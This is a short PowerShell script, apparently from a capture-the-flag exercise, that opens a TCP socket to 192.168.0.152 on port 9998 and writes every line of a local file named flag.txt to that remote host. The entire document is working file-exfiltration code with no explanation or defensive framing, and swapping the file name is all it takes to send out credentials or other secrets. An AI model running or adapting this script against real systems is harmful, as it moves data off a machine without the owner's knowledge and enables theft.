$filePath = "flag.txt"
$address = "192.168.0.152"
$port = 9998
$client = New-Object System.Net.Sockets.TcpClient($address, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
Get-Content $filePath | % { $writer.WriteLine($_) }
$writer.Close()
$client.Close()
